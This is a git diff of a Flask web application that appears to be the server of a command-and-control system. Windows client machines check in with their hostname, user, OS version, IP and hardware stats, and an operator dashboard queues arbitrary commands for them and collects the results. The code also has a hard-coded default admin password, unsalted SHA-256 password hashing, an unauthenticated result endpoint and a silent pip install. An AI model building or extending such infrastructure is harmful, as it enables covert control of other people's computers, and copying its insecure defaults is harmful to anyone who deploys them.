@@ -9,15 +9,40 @@ import hashlib
 from functools import wraps
 from flask import Flask, request, jsonify, render_template, session, redirect, url_for
 
+# ========== CHARGER LE FICHIER .env ==========
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    import subprocess
+    subprocess.check_call(['pip', 'install', 'python-dotenv', '--quiet'])
+    from dotenv import load_dotenv
+    load_dotenv()
+
 app = Flask(__name__)
-app.secret_key = os.environ.get('SECRET_KEY')
+
+# ========== CONFIGURATION DE LA SESSION ==========
+SECRET_KEY = os.environ.get('SECRET_KEY')
+if not SECRET_KEY:
+    env_file = os.path.join(os.path.dirname(__file__), '.env')
+    if os.path.exists(env_file):
+        with open(env_file, 'r') as f:
+            for line in f:
+                if line.startswith('SECRET_KEY='):
+                    SECRET_KEY = line.split('=')[1].strip().strip('"').strip("'")
+                    break
+    if not SECRET_KEY:
+        SECRET_KEY = hashlib.sha256(os.urandom(32)).hexdigest()
+        print(f"[!] Aucune SECRET_KEY, génération automatique : {SECRET_KEY}")
+
+app.secret_key = SECRET_KEY
+
 DATABASE = 'c2_clients.db'
 
 # ========== BASE DE DONNÉES ==========
 def init_db():
     conn = sqlite3.connect(DATABASE)
     c = conn.cursor()
-    # Table des clients
     c.execute('''CREATE TABLE IF NOT EXISTS clients (
         machine_id TEXT PRIMARY KEY,
         computer_name TEXT,
@@ -32,7 +57,6 @@ def init_db():
         ram_available INTEGER,
         status TEXT DEFAULT 'active'
     )''')
-    # Table des commandes
     c.execute('''CREATE TABLE IF NOT EXISTS commands (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         machine_id TEXT,
@@ -44,7 +68,6 @@ def init_db():
         result TEXT,
         FOREIGN KEY(machine_id) REFERENCES clients(machine_id)
     )''')
-    # Table des logs d'activité
     c.execute('''CREATE TABLE IF NOT EXISTS activity_logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         action TEXT,
@@ -52,12 +75,10 @@ def init_db():
         details TEXT,
         timestamp TIMESTAMP
     )''')
-    # Table des administrateurs (simple)
     c.execute('''CREATE TABLE IF NOT EXISTS admins (
         username TEXT PRIMARY KEY,
         password_hash TEXT
     )''')
-    # Ajouter un admin par défaut si aucun
     c.execute("SELECT * FROM admins")
     if not c.fetchone():
         default_hash = hashlib.sha256("admin123".encode()).hexdigest()
@@ -88,24 +109,21 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
-# ========== FONCTIONS UTILITAIRES ==========
 def generate_token(machine_id):
     secret = os.environ.get('SECRET_KEY', 'change_me')
     return hashlib.sha256(f"{machine_id}{secret}{datetime.datetime.now()}".encode()).hexdigest()[:32]
 
-# ========== API POUR LE CLIENT ==========
+# ========== API CLIENT ==========
 @app.route('/api/heartbeat', methods=['POST'])
 def heartbeat():
     data = request.get_json()
     if not data or 'machine_id' not in data:
         return jsonify({'error': 'missing machine_id'}), 400
-    
     machine_id = data['machine_id']
     conn = get_db()
     cur = conn.execute('SELECT * FROM clients WHERE machine_id = ?', (machine_id,))
     client = cur.fetchone()
     token = generate_token(machine_id) if not client else client['token']
-    
     conn.execute('''INSERT OR REPLACE INTO clients 
         (machine_id, computer_name, username, windows_version, ip, last_seen, token,
          disk_total, disk_free, ram_total, ram_available, status)
@@ -125,14 +143,12 @@ def get_commands(machine_id):
     if not auth or not auth.startswith('Bearer '):
         return jsonify({'error': 'unauthorized'}), 401
     token = auth.split(' ')[1]
-    
     conn = get_db()
     cur = conn.execute('SELECT token FROM clients WHERE machine_id = ?', (machine_id,))
     row = cur.fetchone()
     if not row or row['token'] != token:
         conn.close()
         return jsonify({'error': 'invalid token'}), 401
-    
     cur = conn.execute('SELECT id, command_type, params FROM commands WHERE machine_id = ? AND status = "pending" ORDER BY created_at ASC', (machine_id,))
     commands = [{'id': r['id'], 'type': r['command_type'], 'params': json.loads(r['params']) if r['params'] else {}} for r in cur.fetchall()]
     conn.close()
@@ -143,11 +159,9 @@ def command_result():
     data = request.get_json()
     if not data or 'machine_id' not in data or 'command_id' not in data:
         return jsonify({'error': 'missing fields'}), 400
-    
     machine_id = data['machine_id']
     command_id = data['command_id']
     result = data.get('result')
-    
     conn = get_db()
     conn.execute('UPDATE commands SET status = "executed", executed_at = ?, result = ? WHERE id = ?',
                  (datetime.datetime.now(), json.dumps(result), command_id))
@@ -156,19 +170,18 @@ def command_result():
     log_activity('command_result', machine_id, f"Command {command_id} executed")
     return jsonify({'status': 'ok'})
 
-# ========== API POUR L'INTERFACE WEB ==========
+# ========== API INTERFACE WEB ==========
 @app.route('/api/clients')
 @login_required
 def api_clients():
     conn = get_db()
-    cur = conn.execute('SELECT machine_id, computer_name, username, windows_version, ip, last_seen, status FROM clients ORDER BY last_seen DESC')
+    cur = conn.execute('SELECT machine_id, computer_name, username, windows_version, ip, last_seen, status, disk_total, disk_free, ram_total, ram_available FROM clients ORDER BY last_seen DESC')
     clients = []
     for r in cur.fetchall():
         client = dict(r)
-        # Calculer le temps depuis last_seen
         if client['last_seen']:
             delta = datetime.datetime.now() - datetime.datetime.fromisoformat(client['last_seen'].replace(' ', 'T'))
-            client['online'] = delta.total_seconds() < 300  # 5 minutes
+            client['online'] = delta.total_seconds() < 300
         else:
             client['online'] = False
         clients.append(client)
@@ -207,30 +220,27 @@ def api_send_command():
     data = request.get_json()
     if not data or 'machine_id' not in data or 'command_type' not in data:
         return jsonify({'error': 'missing fields'}), 400
-    
     machine_id = data['machine_id']
     command_type = data['command_type']
     params = data.get('params', {})
-    
     conn = get_db()
     cur = conn.execute('SELECT machine_id FROM clients WHERE machine_id = ?', (machine_id,))
     if not cur.fetchone():
         conn.close()
         return jsonify({'error': 'client not found'}), 404
-    
     cursor = conn.execute('INSERT INTO commands (machine_id, command_type, params, created_at, status) VALUES (?, ?, ?, ?, "pending")',
                           (machine_id, command_type, json.dumps(params), datetime.datetime.now()))
     command_id = cursor.lastrowid
     conn.commit()
     conn.close()
-    log_activity('send_command', machine_id, f"Command: {command_type}")
-    return jsonify({'status': 'command queued', 'command_id': command_id})
+    log_activity('send_command', machine_id, f"Commande: {command_type}")
+    return jsonify({'status': 'command queued', 'command_id': command_id, 'command_type': command_type})
 
 @app.route('/api/command_result/<int:command_id>')
 @login_required
 def api_command_result(command_id):
     conn = get_db()
-    cur = conn.execute('SELECT result, status FROM commands WHERE id = ?', (command_id,))
+    cur = conn.execute('SELECT result, status, command_type FROM commands WHERE id = ?', (command_id,))
     row = cur.fetchone()
     conn.close()
     if row:
@@ -238,7 +248,7 @@ def api_command_result(command_id):
             result = json.loads(row['result']) if row['result'] else None
         except:
             result = row['result']
-        return jsonify({'status': row['status'], 'result': result})
+        return jsonify({'status': row['status'], 'result': result, 'command_type': row['command_type']})
     return jsonify({'error': 'not found'}), 404
 
 @app.route('/api/stats')
@@ -273,17 +283,16 @@ def login():
         username = request.form.get('username')
         password = request.form.get('password')
         password_hash = hashlib.sha256(password.encode()).hexdigest()
-        
         conn = get_db()
         cur = conn.execute('SELECT * FROM admins WHERE username = ? AND password_hash = ?', (username, password_hash))
         if cur.fetchone():
             session['logged_in'] = True
             session['username'] = username
-            log_activity('login', None, f"Admin {username} logged in")
+            log_activity('login', None, f"Admin {username} s'est connecté")
             conn.close()
             return redirect(url_for('dashboard'))
         conn.close()
-        return render_template('login.html', error='Invalid credentials')
+        return render_template('login.html', error='Identifiants incorrects')
     return render_template('login.html')
 
 @app.route('/logout')
@@ -296,7 +305,6 @@ def logout():
 def dashboard():
     return render_template('index.html', username=session.get('username'))
 
-# ========== LANCEMENT ==========
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
